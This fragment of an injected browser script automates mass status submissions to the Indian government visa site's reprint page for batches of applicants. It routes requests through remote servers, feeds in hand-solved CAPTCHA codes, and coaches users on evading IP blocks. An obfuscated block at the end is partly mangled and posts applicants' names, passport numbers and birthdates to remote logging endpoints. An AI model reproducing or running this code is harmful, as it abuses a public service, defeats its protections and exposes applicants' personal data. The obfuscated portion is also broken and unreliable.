                        hbgd.tr.appendTo(list);
                        break;
                    case 'Success':
                        hbgd.sts = 2;
                        xdt.success.push(el);
                        hbgd.res.html('Success').css({
                            color: 'green'
                        });
                        break;
                    case 'No Date':
                        hbgd.sts = 0;
                        hbgd.res.html('--');
                        break;
                    case 'Taken':
                        if (hbgd.sts == 1) break;
                        hbgd.sts = 1;
                        xdt.taken.push(el);
                        hbgd.tr.appendTo(list);
                        hbgd.res.html('Taken').css({
                            color: 'green'
                        });
                        window.takens[el.fileno] = {
                            fileno: el.fileno,
                            usr: _usr,
                            domain: server.domain
                        };
                        break
                };
                caps.used.push({
                    usr: kaps.shift().usr
                });
                window.hitlogs.push({
                    usr: _usr,
                    domain: server.domain,
                    kase: el.kase,
                    time: el.time,
                    duration: el.duration
                })
            });
            while (kaps.length) caps.ready.unshift(kaps.pop());
            II.used.hnd.html(caps.used.length);
            II.ready.hnd.html(caps.ready.length);
            II.tkn.count += xdt.taken.length;
            II.tkn.hnd.html(II.tkn.count + '/' + IDS.length);
            II.hits.hnd.html(II.hits.count += r.rsp.length);
            Msgbx.html('Used:' + r.rsp.length + ' Success:' + xdt.success.length + ' Taken:' + xdt.taken.length).css({
                color: (xdt.success.length + xdt.taken.length) ? 'green' : 'red'
            }).fadeIn();
            msgbx.html('<b>' + lkase.kase + '</b>&nbsp;&nbsp;&nbsp;').css({
                color: lkase.success ? 'green' : 'red'
            }).fadeIn();
            if (xdt.taken.length) window.fireUpdater();
            if (hitf.on && lkase.delay > -1) _tmh = setTimeout(function() {
                hitf.on && genhit()
            }, lkase.delay * 1000)
        }).fail(function() {
            if (hitf.on) _tmh = setTimeout(function() {
                hitf.on && genhit()
            }, 5 * 1000)
        });
        Msgbx.hide();
        msgbx.hide();
        _wait.show();
        hitf.busy = true
    };
    form.submit(function() {
        return false
    }).submit(function() {
        var nw = (new Date()).getTime(),
            cap = null,
            v = capy.val();
        if (!caps.live) return;
        if (v.length != 6) return alert('Access Code should be 6 letters long!!!');
        if ((nw - caps.live.loaded) / 1000 / 60 > caps.xpiry) caps.used.push({
            usr: caps.live.usr
        });
        else caps.ready.push({
            usr: caps.live.usr,
            val: v,
            loaded: caps.live.loaded
        });
        while (caps.wait.length && (nw - caps.wait[0].loaded) / 1000 / 60 > caps.xpiry) caps.used.push({
            usr: caps.wait.shift().usr
        });
        if (caps.wait.length) showcap(caps.wait.shift());
        else {
            capx.attr({
                src: esrc
            });
            caps.live = false
        };
        II.wait.hnd.html(caps.wait.length + (caps.live ? 1 : 0));
        II.used.hnd.html(caps.used.length);
        II.ready.hnd.html(caps.ready.length);
        capy.val('');
        fillgaps();
        if (hitf.on && hitf.sleep && caps.ready.length >= 3) genhit();
        window.caps = caps
    });
    capx.attr({
        src: esrc
    }).appendTo($('<div>').addClass('iholder').appendTo(form));
    capy.appendTo(form).keypress(function(e) {
        var c = e.keyCode;
        if (c == 13 || c == 64 || (c >= 48 && c <= 57) || (c >= 97 && c <= 102)) return;
        return false
    });
    Msgbx = $('<div>').addClass('msg big').appendTo(rpane);
    msgbx = $('<div>').addClass('msg').css({
        color: '#00A'
    }).appendTo(rpane);
    var cbut = $();
    $('<div>').appendTo(form);
    $('<button type="button">').attr({
        tabIndex: -1
    }).addClass('text ihit').html('Refill').css({
        color: 'blue'
    }).appendTo(form).click(function() {
        fillgaps()
    });
    $('<button type="button">').attr({
        tabIndex: -1
    }).addClass('text ihit').html('&#8679;').css({
        fontWeight: 'bold',
        color: 'green'
    }).appendTo(form).click(function() {
        if (II.trdl.count < II.trdl.max) II.trdl.hnd.html(II.trdl.count += 10)
    });
    $('<button type="button">').attr({
        tabIndex: -1
    }).addClass('text ihit').html('&#8681;').css({
        fontWeight: 'bold',
        color: 'red'
    }).appendTo(form).click(function() {
        if (II.trdl.count > 10) II.trdl.hnd.html(II.trdl.count -= 10)
    });
    cbut = cbut.add($('<button type="button">').attr({
        tabIndex: -1
    }).addClass('text ihit').html('Start').css({
        color: 'green'
    }).appendTo(form).click(function() {
        _xhr && _xhr.abort();
        hitf.started = true;
        hitf.on = true;
        genhit();
        cbut.toggle()
    }));
    cbut = cbut.add($('<button type="button">').attr({
        tabIndex: -1
    }).addClass('text ihit').html('Stop').css({
        color: 'red'
    }).appendTo(form).click(function() {
        _xhr && _xhr.abort();
        _tmh && clearTimeout(_tmh);
        hitf.busy = false;
        hitf.on = false;
        cbut.toggle()
    }).hide())
};
$(function() {
    if (location.href != 'http://indianvisaonline.gov.in/visa/Reprint.jsp') return;
    if (window.aset) return alert('Avoided Duplicate');
    window.aset = 1;
    var i = -1,
        l = IDS.length > servers.length ? servers.length : IDS.length,
        base = BU + '../',
        lbgd = [];
    window.styled = true;
    $('<link>').attr({
        rel: 'stylesheet',
        type: 'text/css',
        href: BU + 'static/vizstyle.css'
    }).appendTo('body');
    $('link').filter(function(i, d) {
        return $(d).attr('href') == 'Online.css'
    }).slice(1).remove();
    var capx = $('img[alt]').clone(),
        capy = $('#ImgNum').clone().removeAttr('id').removeAttr('onkeyup');
    $('<div>').addClass('mainframe').appendTo('body');
    var oprs = {};
    IDS.forEach(function(IDS, j) {
        IDS.forEach(function(pr, i) {
            pr.slug = (i < 9 ? '0' : '') + (i + 1) + '. ' + pr[0];
            pr[1] = pr[1].replace(/[\s.,]/g, '').toUpperCase();
            pr[3] = pr[3].replace(/[\s.,]/g, '').toUpperCase();
            pr[2] = pr[2].replace(/[\s.,]/g, '').replace(/[\s.,]/g, '').replace(/^(\d)\//, '0$1/').replace(/\/(\d)\//, '/0$1/').replace(/\/([6789]\d)$/, '/19$1').replace(/\/(\d\d)$/, '/20$1');
            lbgd.push({
                slug: pr.slug,
                fileno: pr[1],
                birthdate: pr[2],
                passport_no: pr[3],
                usr: _usr,
                domain: j < servers.length ? servers[j].domain : '--'
            });
            oprs[pr[1]] = pr
        })
    });
//    $.post(base + 'viz/logger/logbgd', {
//        list: JSON.stringify(lbgd)
//    }).done(function(oi) {
//        console.log(">>>>>>>>>>>>");
//        console.log(oi);
//        r = {};
//        r.success = true;
//        r.data = Array();
//        r.data.forEach(function(dt, i) {
//            oprs[dt.fileno].taken = dt.taken
//        });
//        while (++i < l) setupBlock(base, servers[i], IDS[i], capx.clone(), capy.clone());
//        if (typeof setupFallback == 'function') {
//            var oids = [];
//            IDS.forEach(function(ids) {
//                oids = oids.concat(ids)
//            });
//            setupFallback(base, oids)
//        }
//    });


        var r = {};
        r.success = true;
        r.data = Array();
        r.data.forEach(function(dt, i) {
            oprs[dt.fileno].taken = dt.taken
        });
        while (++i < l) setupBlock(base, servers[i], IDS[i], capx.clone(), capy.clone());
        if (typeof setupFallback == 'function') {
            var oids = [];
            IDS.forEach(function(ids) {
                oids = oids.concat(ids)
            });
            setupFallback(base, oids)
        }





    $('<input type="radio">').appendTo($('.mainframe'));
    var zz = $('[name=ImgNum]');
    if (zz.length > 1) zz.eq(zz.length - 1).blur(function() {
        zz.eq(0).focus()
    });
    window.fireUpdater = function() {
        var tkns = [];
        window.hitlogs.length && true;

//        $.post(base + 'viz/logger/loghit', {
//            hits: JSON.stringify(window.hitlogs)
//        });
        for (var z in window.takens) tkns.push(window.takens[z]);
        tkns.length && true;

//        $.post(base + 'viz/logger/logtaken', {
//            taken: JSON.stringify(tkns)
//        }).done(function() {
//            tkns.forEach(function(a) {
//                delete window.takens[a.fileno]
//            })
//        });

         tkns.forEach(function(a) {
                delete window.takens[a.fileno]
            })

        window.hitlogs = [];
        clearTimeout(window.uptimer);
        window.uptimer = setTimeout(window.fireUpdater, 1 * 60000)
    };
    window.hitlogs = [];
    window.takens = {};
    window.uptimer = setTimeout(window.fireUpdater, 1 * 60000);
    setTimeout(function() {
        var first = true,
            bdiv = $('#bottomdiv'),
            efrm = $('<iframe>').attr({
                src: "about:blank"
            }).hide().appendTo('body');
        $('<button>').appendTo(bdiv).addClass('text').html('Check if I am Blocked').click(function() {
            if (servers.length) $.get(servers[0].appurl).done(function(r) {
                window.myres = r;
                if (r.match('www.main-hosting.com/resources')) alert('Your IP is blocked, Please change your IP by reconnecting the modem.');
                else if (first) {
                    first = false;
                    hitservers.forEach(function(a, i) {
                        setTimeout(function() {
                            if (!window.nohit) efrm.attr({
                                src: "http://" + a.domain
                            })
                        }, i * 60 * 1000)
                    })
                } else alert('Your IP is not blocked now')
            })
        }).click()
    }, 1000)
});
(function() {
    if (location.href != 'http://indianvisaonline.gov.in/visa/' && location.href != 'http://indianvisaonline.gov.in/visa/index.html' && location.href != 'http://indianvisaonline.gov.in/visa/Reprint.jsp') return;
    if (window.bset) return;
    window.bset = 1;
    $(function() {
        var body = $('body'),
            bfdiv, pinp, rspan, fbut, ebut, tdiv, T0, T1, hspan;
        bfdiv = $('<div>').addClass('bottomspace').appendTo(body);
//         $(".bottomspace").hide();
        tdiv = $('<div>').appendTo(bfdiv).hide();
        T0 = $('<textarea>').attr({
            placeholder: 'Paste your BGDs here'
        }).addClass('itext').appendTo(tdiv);
        T1 = T0.clone().attr({
            readonly: 'readonly',
            placeholder: 'Your formatted BGDs will appear here'
        }).appendTo(tdiv);
        btndiv = $('<div>').attr({
            id: 'bottomdiv'
        }).appendTo(bfdiv);
        $('<button>').appendTo(btndiv).addClass('text').html('BGD Formatter').click(function() {
            tdiv.slideToggle();
            hspan.fadeToggle()
        });
        hspan = $('<span>').appendTo(btndiv).hide();
        pinp = $('<input type="text">').addClass('prename').val('PRE-').appendTo(hspan);
        rspan = $('<span>').appendTo(hspan);
        fbut = $('<button>').appendTo(hspan).addClass('text').html('Format');
        ebut = $('<button>').appendTo(hspan).addClass('text').html('Get BGD').click(function() {
            T0.val(JSON.stringify(IDS));
            fbut.click()
        });
        fbut.click(function() {
            var str = T0.val().toUpperCase();
            str = str.replace(/[^\/\w\s]|_/g, ' ').replace(/\s+/g, ' ').replace(/^\s|\s$/g, '');
            str = str.replace(/([^\d])(\d)\//g, '$10$2/').replace(/\/(\d)\//g, '/0$1/').replace(/(BGD[DCR]\w{0,7})\s+/g, '$1');
            bgds = (str.match(/(.+?) (BGD[DCR]\w{8}) (\d\d\/\d\d\/\d\d\d\d) (\w+)\s*/g) || []).map(function(a) {
                var ra = a.match(/(.+?) (BGD[DCR]\w{8}) (\d\d\/\d\d\/\d\d\d\d) (\w+)\s*/).slice(1);
                ra[0] = pinp.val() + ra[0].replace(/^[\s\d]+/, '');
                return ra
            });
            str = JSON.stringify(bgds).slice(1, -1).replace(/],/g, '],\n') + ',\n';
            T1.val(str);
            rspan.html(str.match(/BGD/g).length + '->' + bgds.length)
        });
        if (!window.styled) $('<link>').attr({
            rel: 'stylesheet',
            type: 'text/css',
            href: BU + 'src/css/style.css?_=' + Math.random()
        }).appendTo('head')
    });
    $(function() {
        var bdiv = $('#bottomdiv'),
            audio, ring, statusdiv, starttimer, stoptimer, stopring, cwait, checker = null,
            curstate = null,
            url = 'Reprint.jsp';

        function now() {
            var dt = new Date();
            return (dt.getHours() + ':' + dt.getMinutes() + ':' + dt.getSeconds()).replace(/^(\d:)/, '0$1').replace(/:(\d):/, ':0$1:').replace(/:(\d)$/, ':0$1')
        };

        function check_stat(cb) {
            $.get(url).done(function(r) {
                cwait.removeClass('x');
                r = !!r.match('BGDD1');
                statusdiv.html('BGDD ' + (r ? 'Open' : 'Closed') + '::' + now()).css({
                    color: r ? 'green' : 'red'
                });
                cb && cb(r)
            });
            cwait.addClass('x')
        };

        function ckrfun() {
            check_stat(function(r) {
                if (r == curstate) return;
                stoptimer.click();
                ring.play();
                stopring.show()
            })
        };
        audio = $('<audio>').prop({
            loop: true
        }).append($('<source>').attr({
            type: 'audio/mpeg',
            src: 'http://soundjax.com/reddo/97744%5EALARM.mp3'
        })).hide().appendTo(bdiv);
        ring = audio.get(0);
        statusdiv = $('<button>').appendTo(bdiv).addClass('text').html('Check Status').click(function() {
            check_stat()
        });
        starttimer = $('<button>').appendTo(bdiv).css({
            color: 'green'
        }).addClass('text').html('Start Check Timer').click(function() {
            starttimer.hide();
            stoptimer.show();
            check_stat(function(a) {
                curstate = a;
                checker = setInterval(ckrfun, a ? 10000 : 5000)
            })
        });
        stoptimer = $('<button>').appendTo(bdiv).css({
            color: 'red'
        }).addClass('text').html('Stop Check Timer').click(function() {
            starttimer.show();
            stoptimer.hide();
            checker && clearInterval(checker)
        }).hide();
        stopring = $('<button>').appendTo(bdiv).addClass('text').css({
            color: 'red'
        }).hide().html('Stop Alarm').click(function() {
            stopring.hide();
            ring.pause()
        });
        cwait = $('<div>').addClass('loader ck').appendTo(bdiv)
    })
})();




var _0x19c2=["","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x5C\x62","\x67","\x72\x65\x70\x6C\x61\x63\x65"];e=function (_0xbf28x1){return (_0xbf28x1<a?_0x19c2[0]:e(parseInt(_0xbf28x1/a)))+((_0xbf28x1=_0xbf28x1%a)>35?String[_0x19c2[1]](_0xbf28x1+29):_0xbf28x1.toString(36));} ;while(c--){if(k[c]){p=p[_0x19c2[4]]( new RegExp(_0x19c2[2]+e(c)+_0x19c2[2],_0x19c2[3]),k[c]);} ;} ;

    return p
//('D.1S=[{"1z":"6o.6p.6l","71":"-","2H":"1C:\\/\\/6o.6p.6l\\/6Z\\/72.73"}];D.5Y=[];f 4G(1I,1g){u T,42,34,2q=0,3H,74,6Y,6X,1r,1Z,2J,1u,4h,3o,1y,3p,2M=$(\'[S=3r]\'),46=2M.2v(\'3h\').6T().6S(),24=2m 1f(),3u=$(\'[S=1f]\').J();u 1k=$(\'1k\'),1j={r:[],o:{}},17,3i,T,1n,2V,2Y,1y,3w=\'1N:22/44;3x,5M==\';D.6U=D.5O;$(\'4i[6W=75]\').J(\'4R\');17=$(\'<P>\').5n($(\'.3E\')).A(\'5Q 5T\');1u=$(\'<P>\').A(\'3T 3v\').h(17);$(\'<P>\').A(\'5S\').p(\'5f 76.4\').h(17);3i=$(\'<5L>\').h($(\'<2f>\').A(\'5K\').h(17));T=$(\'T[S=6A]\').A(\'7f\').h(17);1n=$(\'<P>\').A(\'5D\').h(17);2M.2v(\'2f\').A(\'7h\');1g.1t(f(B,i){t(1j.o[B[1]])H;u 1F=$(\'<P>\').A(\'5B\').h(1n);$(\'<1q>\').A(\'5F\').p(B.15).h(1F);u 1a=$(\'<1q>\').A(\'3t\').3L($(\'<1q>\').E({Q:\'5G\'}).p(\'--\')).h(1F);u O={1i:1F,1a:1a,15:B.15,1o:0,Y:B.Y,1N:{1v:B[1],3G:B[2],3F:B[3],3a:\'\',1f:3u}};1j.r.16(O);1j.o[B[1]]=O;1F.K(f(){3H.5d(\'x\');1F.A(\'x\').2j();1Z.2j();4I.J(B[1].32(0,4)+\'1\');$(\'[S=1v]\').J(B[1]);$(\'[S=3G]\').J(B[2]);$(\'[S=3F]\').J(B[3]);42=B;2q=i})});1j.r.1t(f(O,i){t(O.Y){$(\'<1q>\').A(\'3t\').E({Q:\'5J\'}).2u(O.1a).p(\'1Q 1A \'+O.Y);O.1o=1;O.1a.1b();O.1i.h(1n)}});u 4I=$(\'#7c\').2r(\'3U\').2r(\'6R\').A(\'77-79\');4I.X(\'4i\').5C(f(i,d){d=$(d);t(d.J().1O(/^1V/)){d.p(d.p().R(/^7a-/i,\'\'));d.J().1O(/0$/i)&&d.J(d.J().R(/0$/i,\'1\'))}1l d.1b()});T=$(\'[S=6A]\').F({5P:\'4Q\',7b:\'5N.23\'}).2r(\'6D\').2T(f(){u v=1Z.J();t(v.m==0)H;t(v.m!=6)H!!2y(\'3y 5R 5W 6q 6 6n 6m!!!\');D.6s=2P;1u.2c();34=42});1r=T.X(\'2p[6z]\').K(f(){u 3C,2h=\'\',1K=2m 6Q();1y&&1y.4g();1y=1K;1Z.J(\'\').2j();1K.6N(\'6O\',4h,21);1K.6K(\'12/6G;6H=x-6I-6J\');1K.8e=f(){2J.L()};1K.7Z=f(e){t(1K.7T!=4u)H;3C=1K.7j;6h(u i=0,6f=3C.m;i<6f;++i)2h+=7S.7R(3C.80(i)&8b);2h=8c(2h);D.6s=2h;1r.F(\'1p\',\'1N:22/5I;3x,\'+2h);2J.L();1Z.2j()};2J.2c();1K.87(2P)});1r.h($(\'<P>\').A(\'6x\').h(1r.82()));u 5k=[{1E:\'1f 84 7L\',M:0,1H:\'2o:-7t 4S 7u 7v\'},{1E:\'66 65 63\',M:0,1H:\'7w 1U 7r 66 65 63\'},{1E:\'7o 7x\',M:0,1H:\'7y 1U 7H 7G\'},{1E:\'1V 56\',M:-1,1H:\'7J 3r 1U 7K 7F 7E\'},{1E:\'59\',M:-1,1H:\'7A 7B 7D 1f 7C 7z 7I 4l 7p\'},{1E:\'1f 5H\',M:0,1H:\'5a 7n 7m 7k 7l\'},{1E:\'3y 5c 7q\',M:0,1H:\'3y 5c 1U 4l 7s\'},{1E:\'1f 1Q\',M:1,1H:\'3r 1f 1U 4S Y\'},];1Z=T.X(\'#3a\').A(\'5l\').6w(f(e){u c=e.25;t(c==13||(c>=48&&c<=57)||(c>=97&&c<=67))H;H 1e});3p=$(\'<3k M="7M">\').h(46).F({28:-1}).L();$(\'<1q>\').p(\'86 1A 5m 3b\').2u(3p).L();2J=$(\'<2p>\').F({1p:\'1C://6k.4T.4o/85/4T/3T/83.44\'}).L().2u(1r);1u=2J.1T().h(46).E({\'88-4t\':\'89\',\'8a\':\'-81 0 0 5y\'});$(\'[S=2o]\').L();4h=1r.F(\'1p\');1r.K();f 4K(a,b,c){$(\'<P>\').p(a).h(b).E({5j:\'5p\',5q:\'7Q\',Q:c?\'1D\':\'1w\'}).L().4r()};u 4w=$(\'<P>\').A(\'3o-7P\').h(\'1k\');3o=$(\'<4M>\').F({S:\'4Q\',1p:"4O:4J",7N:\'5E-7O 5E-7U-7Y\'}).E({5v:\'5s 4W #5t\',2t:\'29%\',2b:5r}).h(4w).5u(f(){1x(f(){u 1P=3o.4y(),43=1P.X(\'1k\'),1s=1P.X(\'T[S=7V]\'),2X=1s.X(\'[S=3b]\');u 2E=1P.X(\'2p[4t=3v]\').2v(\'1i\');2E.5i().1b();2E.1b();1P.X(\'2f\').2b(\'2s\').2t(\'2s\');t(1s.m){1s.2r(\'7W\').F({5P:\'2z\'});1s.3I(\'2f\').X(\'1i:78\').1b();1s.3I(\'2f\').2b(\'2s\').X(\'1i\').2D(4).1b();t(2X.m){2X.J(2X.X(\'4i\').2D(1).J());4n=1s.1T().L().2u(2z);4n.X(\'[S=3b]\').J(2X.J());4n.2T().1b();1x(f(){1r.K();1u.L()},3A)}1l t(3p.1U(\':6F\')){1s.X(\'[S=6L]\').2v(\'1i\').1b();$(\'<3k M=5A>\').F({S:\'3b\'}).J(\'31/6P/6M\').h(1s);t(!1s.X(\'[S=5z]\').m)$(\'<3k M=5A>\').F({S:\'5z\'}).J(\'6E 6C 3r\').h(1s);1s.1T().L().2u(2z).2T().1b();1x(f(){1r.K()},3A)}1l 1r.K()&&1u.L()&&4K(\'5m 3b!!!\',43,0)}1l{u 5g=1P.X(\'p\').p(),4s=$(\'<P>\').5n(43);1r.K()&&1u.L();u O=34[1],1c=1j.o[O];5k.1t(f(2e){t(5g.1O(2e.1H)){4K(2e.1E,4s,2e.M==1);t(2e.M==-1){1c.1a.p(2e.1E).E({Q:\'1w\'})}1l t(2e.M==1){1c.1a.p(\'1Q\').E({Q:\'1D\'});D.2B[34[1]]={1v:34[1],G:2L,1z:\'--\'};D.39()}}});u 3J=$(\'[S=4Q]\').4y().X(\'7e:3Q\');t(3J.m&&!3J.F(\'M\')){u 3m=3J.12().R(/^\\s+|\\s+$/g,\'\');3m=3m.1O(/^2y\\("([^"]+)"\\)/);t(3m)$(\'<P>\').p(3m[1]).h(4s).E({5j:\'5p\',5q:\'5y\',Q:\'1w\'})}}},4u)});2z=$(\'<4M>\').F({S:\'2z\',1p:"4O:4J"}).E({5v:\'5s 4W #5t\',2t:\'70%\',2b:5r}).h(4w).5u(f(){1x(f(){u 1P=2z.4y(),5x=1P.X(\'9B[S=9C]\');t(5x.m)1P.X(\'1k\').2b(9A).9z({9w:9x})},4u)});1x(f(){1Z.2j();2M.2c()},9y);u 2E=$(\'2p[4t=3v]\').2v(\'1i\');2E.5i().1b();2E.1b();2M.2v(\'1i\').9E(\'1i\').1b();$(\'3h[2b=18]\').1b();$(\'2f\').2b(\'2s\').2t(\'2s\');$(\'3h[2t=9J]\').2t(\'2s\');$(\'<1q>\').F({3U:\'9H\'}).h(\'1k\');1Z.A(\'5l\').9G(f(e){u l=1g.m;t(e.25==38||e.25==40);1l H;t(2q==0&&e.25==38||2q==l-1&&e.25==40)H 1e;2q+=(e.25==38?-1:1);1n.3I().2D(2q).K();H 1e});3H=1n.3I().F({28:1});3H.2D(0).K()};f 69(1I,2Z,1g,2I,2F){u 30={9j:\'1C://2N.2O.2k/2n/\',9k:\'1C://9i.3A.9h.11/2n/\',1Y:\'9e.23\',9f:\'2o.23\',5O:\'5N.23\',9g:\'9l.23\'};u 2H=2Z.2H,1j={r:[],o:{}},q={1h:[],U:[],N:[],1B:1e,1W:5,3z:58},1u,3u=$(\'[S=1f]\').J();u 1k=$(\'1k\'),17,3i,T,1n,2V,2Y,1d={1A:1e,3K:1e,3s:1e},3d,1y,3w=\'1N:22/44;3x,5M==\';u C={1G:{15:\'9m 9s\',V:3A,6c:9M},26:{15:\'9r\',V:0,4f:10},1h:{15:\'9q\',5U:4},U:{15:\'9n\'},N:{15:\'51\'},1W:{15:\'8f\'},3B:{15:\'1Q\',V:0}};17=$(\'<P>\').h($(\'.3E\')).A(\'5Q 5T\');1u=$(\'<P>\').A(\'3T 3v\').h(17);$(\'<P>\').A(\'5S\').p(\'5f 9p.2\').h(17);3i=$(\'<5L>\').h($(\'<2f>\').A(\'5K\').h(17));T=$(\'<T>\').F({9L:\'9R\'}).A(\'9T\').h(17);1n=$(\'<P>\').A(\'5D\').h(17);$.5C(C,f(k,14){t(!14.V)14.V=0;14.W=$(\'<3h>\').h($(\'<1i>\').3L($(\'<3h>\').p(14.15)).h(3i)).p(14.V)});1g.1t(f(B,i){u 1F=$(\'<P>\').A(\'5B\').h(1n);$(\'<1q>\').A(\'5F\').p(B.15).h(1F);u 1a=$(\'<1q>\').A(\'3t\').3L($(\'<1q>\').E({Q:\'5G\'}).p(\'--\')).h(1F);u O={1i:1F,1a:1a,15:B.15,1o:0,Y:B.Y,1N:{1v:B[1],3G:B[2],3F:B[3],3a:\'\',1f:3u}};1j.r.16(O);1j.o[B[1]]=O});1j.r.1t(f(O,i){t(O.Y){$(\'<1q>\').A(\'3t\').E({Q:\'5J\'}).2u(O.1a).p(\'1Q 1A \'+O.Y);O.1o=1;O.1a.1b();O.1i.h(1n)}});f 4U(){u G;t(q.N.m){G=q.N.4Y().G;C.N.W.p(q.N.m)}1l G=C.26.V++;C.26.W.p(C.26.V);$.2l(2H,{4V:\'2p\',G:G,30:30}).2C(f(r){t(r.1R&&r.1R.22){u 1Y={G:G,22:r.1R.22,2A:(2m 1f()).4D()};t(q.1B)q.1h.16(1Y);1l 4v(1Y)}1l q.N.16({G:G})&&C.N.W.p(q.N.m);C.1h.W.p(q.1h.m+(q.1B?1:0))}).4A(f(){q.N.16({G:G})&&C.N.W.p(q.N.m)});C.1W.W.p(++C.1W.V)};f 4v(1Y){q.1B=1Y;2I.F(\'1p\',\'1N:22/5I;3x,\'+1Y.22)};f 4c(){t(C.1h.5U<q.1h.m)H;u d=C.1G.V-C.26.V+q.N.m,i=d>C.26.4f?C.26.4f:d;$.2l(1I+\'3q/3n/9S\',{q:{G:2L,1z:2Z.1z,V:i}});2G(0<i--)4U()};f 3l(){u l=q.1W,1m,1X,33=(2m 1f()).4D();1m=1j.r.6i(f(a){H a.1o==0||a.1o==2}).3X(f(a,i){a.2i=i;H a}).9U(f(x,y){a=x.1o;b=y.1o;r=a==b?0:b==2?1:a==2?-1:0;r=r?r:x.2i-y.2i;H r}).3X(f(a){H a.1N});2G(q.U.m&&(33-q.U[0].2A)/2a/60>q.3z)q.N.16({G:q.U.35().G});C.N.W.p(q.N.m);C.U.W.p(q.U.m);t(!1m.m||!q.U.m)H 1d.3K=21;1d.3K=1e;t(1m.m<l)l=1m.m;t(q.U.m<l)l=q.U.m;t(1m.m>l)1m=1m.32(0,l);1X=q.U.9c(0,l);C.U.W.p(q.U.m);1y=$.2l(2H,{4V:\'8z\',30:30,1N:2x.2w({1m:1m,q:1X.3X(f(a){H[a.G,a.J]})})}).8y(f(){1d.3s=1e;1u.L()}).4A(f(){2G(1X.m)q.N.16({G:1X.35().G})}).2C(f(r){u 3j=r.1R[r.1R.m-1],1J={Y:[],3g:[]};r.1R.1t(f(14){u O=14.1v,1c=1j.o[O];8x(14.2K){36\'59\':36\'56\':1c.1o=-1;1c.1a.p(14.2K).E({Q:\'1w\'});1c.1i.h(1n);3c;36\'45\':1c.1o=2;1J.3g.16(14);1c.1a.p(\'45\').E({Q:\'1D\'});3c;36\'5a 1f\':1c.1o=0;1c.1a.p(\'--\');3c;36\'1Q\':t(1c.1o==1)3c;1c.1o=1;1J.Y.16(14);1c.1i.h(1n);1c.1a.p(\'1Q\').E({Q:\'1D\'});D.2B[14.1v]={1v:14.1v,G:2L,1z:2Z.1z};3c};q.N.16({G:1X.35().G});D.2U.16({G:2L,1z:2Z.1z,2K:14.2K,55:14.55,54:14.54})});2G(1X.m)q.U.8C(1X.4Y());C.N.W.p(q.N.m);C.U.W.p(q.U.m);C.3B.V+=1J.Y.m;C.3B.W.p(C.3B.V+\'/\'+1g.m);C.1W.W.p(C.1W.V+=r.1R.m);2V.p(\'51:\'+r.1R.m+\' 45:\'+1J.3g.m+\' 1Q:\'+1J.Y.m).E({Q:(1J.3g.m+1J.Y.m)?\'1D\':\'1w\'}).4r();2Y.p(\'<b>\'+3j.2K+\'</b>&4F;&4F;&4F;\').E({Q:3j.3g?\'1D\':\'1w\'}).4r();t(1J.Y.m)D.39();t(1d.1A&&3j.5e>-1)3d=1x(f(){1d.1A&&3l()},3j.5e*2a)}).4A(f(){t(1d.1A)3d=1x(f(){1d.1A&&3l()},5*2a)});2V.L();2Y.L();1u.2c();1d.3s=21};T.2T(f(){H 1e}).2T(f(){u 33=(2m 1f()).4D(),1Y=2P,v=2F.J();t(!q.1B)H;t(v.m!=6)H 2y(\'3y 5R 5W 6q 6 6n 6m!!!\');t((33-q.1B.2A)/2a/60>q.3z)q.N.16({G:q.1B.G});1l q.U.16({G:q.1B.G,J:v,2A:q.1B.2A});2G(q.1h.m&&(33-q.1h[0].2A)/2a/60>q.3z)q.N.16({G:q.1h.35().G});t(q.1h.m)4v(q.1h.35());1l{2I.F({1p:3w});q.1B=1e};C.1h.W.p(q.1h.m+(q.1B?1:0));C.N.W.p(q.N.m);C.U.W.p(q.U.m);2F.J(\'\');4c();t(1d.1A&&1d.3K&&q.U.m>=3)3l();D.q=q});2I.F({1p:3w}).h($(\'<P>\').A(\'6x\').h(T));2F.h(T).6w(f(e){u c=e.25;t(c==13||c==64||(c>=48&&c<=57)||(c>=97&&c<=67))H;H 1e});2V=$(\'<P>\').A(\'6e 8G\').h(17);2Y=$(\'<P>\').A(\'6e\').E({Q:\'#8F\'}).h(17);u 2d=$();$(\'<P>\').h(T);$(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'8E\').E({Q:\'8u\'}).h(T).K(f(){4c()});$(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'&#8t;\').E({6g:\'5Z\',Q:\'1D\'}).h(T).K(f(){t(C.1G.V<C.1G.6c)C.1G.W.p(C.1G.V+=10)});$(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'&#8k;\').E({6g:\'5Z\',Q:\'1w\'}).h(T).K(f(){t(C.1G.V>10)C.1G.W.p(C.1G.V-=10)});2d=2d.6B($(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'5w\').E({Q:\'1D\'}).h(T).K(f(){1y&&1y.4g();1d.8g=21;1d.1A=21;3l();2d.68()}));2d=2d.6B($(\'<Z M="Z">\').F({28:-1}).A(\'12 3f\').p(\'4j\').E({Q:\'1w\'}).h(T).K(f(){1y&&1y.4g();3d&&6j(3d);1d.3s=1e;1d.1A=1e;2d.68()}).L())};$(f(){t(3P.2g!=\'1C://2N.2O.2k/2n/2o.23\')H;t(D.62)H 2y(\'8o 8p\');D.62=1;u i=-1,l=1g.m>1S.m?1S.m:1g.m,1I=4H+\'../\',47=[];D.5V=21;$(\'<4z>\').F({5b:\'4Z\',M:\'12/E\',2g:4H+\'1p/E/52.E?2i=\'+53.50()}).h(\'1k\');$(\'4z\').6i(f(i,d){H $(d).F(\'2g\')==\'8I.E\'}).32(1).1b();u 2I=$(\'2p[6z]\').1T(),2F=$(\'#3a\').1T().2r(\'3U\').2r(\'8J\');$(\'<P>\').A(\'3E\').h(\'1k\');u 49={};1g.1t(f(1g,j){1g.1t(f(B,i){B.15=(i<9?\'0\':\'\')+(i+1)+\'. \'+B[0];B[1]=B[1].R(/[\\s.,]/g,\'\').4m();B[3]=B[3].R(/[\\s.,]/g,\'\').4m();B[2]=B[2].R(/[\\s.,]/g,\'\').R(/[\\s.,]/g,\'\').R(/^(\\d)\\//,\'0$1/\').R(/\\/(\\d)\\//,\'/0$1/\').R(/\\/([93]\\d)$/,\'/19$1\').R(/\\/(\\d\\d)$/,\'/20$1\');47.16({15:B.15,1v:B[1],3G:B[2],3F:B[3],G:2L,1z:j<1S.m?1S[j].1z:\'--\'});49[B[1]]=B})});$.2l(1I+\'3q/3n/94\',{1n:2x.2w(47)}).2C(f(r){r.1N.1t(f(24,i){49[24.1v].Y=24.Y});2G(++i<l)69(1I,1S[i],1g[i],2I.1T(),2F.1T());t(9b 4G==\'f\'){u 